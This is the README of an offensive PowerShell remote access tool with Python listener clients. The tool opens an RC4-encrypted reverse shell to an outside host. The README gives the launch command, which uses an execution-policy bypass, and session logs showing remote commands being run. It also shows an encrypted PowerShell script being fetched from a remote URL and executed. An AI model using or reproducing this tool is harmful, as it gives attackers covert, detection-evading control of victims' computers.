# RC4-PowerShell-RAT
Simple powershell reverse shell using RC4 encryption for all the commands and payloads. PsShellClient.py only accept one client at the time. MultiPsShellClient.py accept several clients at the time.

# Usage
```
PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
```
```
$ python PsShellClient.py
PS-RemoteShell Python Client v1.0
Mr.Un1k0d3r RingZer0 Team


Usage: PsShellClient.py ip port key

$ python PsShellClient.py 0.0.0.0 1111 test
```

```
$ python MultiPsShellClient.py 127.0.0.1 8888 test 20

PS-RemoteShell Python Client v1.1
Mr.Un1k0d3r RingZer0 Team


Help
------
list            List all sessions
interact id     Interact with a session (Example: interact 1)
background      Return to the main console

[*] Waiting for a connection...


(Main Console)>>> [+] *** NEW Callback from 127.0.0.1:49416. Session ID:15

(Main Console)>>> list
Session         Host
---------       ------
15              Callback from 127.0.0.1:49416

(Main Console)>>> interact 15
(192.168.238.1:RINGZER0\mrun1k0d3r):Url >null
(null):Exec >whoami
RINGZER0\mrun1k0d3r

(192.168.238.1:RINGZER0\mrun1k0d3r):Url >background
(Main Console)>>> list
Session         Host
---------       ------
15              Callback from 127.0.0.1:49416

(Main Console)>>> interact 15
RINGZER0\mrun1k0d3r

(192.168.238.1:RINGZER0\mrun1k0d3r):Url >null
(null):Exec >get-process

Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
-------  ------    -----      ----- -----   ------     -- -----------
    147      22     6252      22516   149     0.22   6972 svchost
```

# Example
```
powershell -exec bypass Import-Module .\PS-RemoteShell.ps1; PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
```

```
$ python PsShellClient.py 10.0.0.144 8080 test
PS-RemoteShell Python Client v1.0
Mr.Un1k0d3r RingZer0 Team


[*] Waiting for a connection...
[+] Callback from 10.0.0.144:49758
(192.168.70.133:RINGZER0\ME):Url >https://home.ringzer0team.com/ps.php
(https://home.ringzer0team.com/ps.php):Exec >Get-BrowserHomepage

Start Page
----------
http://go.microsoft.com/fwlink/p/?LinkId=255141



(192.168.70.133:RINGZER0\ME):Url >null
(null):Exec >whoami
RINGZER0\ME

(192.168.70.133:RINGZER0\ME):Url >

The ps.php file located at https://home.ringzer0team.com/ps.php is encrypted using the following key: test
```

# Credit 
Mr.Un1k0d3r RingZer0 Team

https://ringzer0team.com
